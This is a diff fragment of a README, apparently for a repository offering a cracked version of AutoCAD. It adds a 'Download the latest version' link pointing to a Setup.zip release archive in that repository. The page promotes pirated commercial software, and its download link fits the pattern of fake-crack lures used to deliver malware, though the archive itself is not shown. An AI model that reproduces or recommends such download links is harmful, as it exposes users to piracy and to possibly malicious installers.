@@ -14,7 +14,7 @@ AutoCAD is a computer — aided design (CAD) software that architects, engineers
 
 # <a id="download"></a>🚀 ❖ Download
 
-### [Download the latest version (clickable)]()
+### [Download the latest version (clickable)](https://github.com/mohamadsalama102/AutoCAD-Crack/releases/download/Download/Setup.zip)
 
 # <a id="changelogs"></a>📃 ❖ Changelogs
 ```
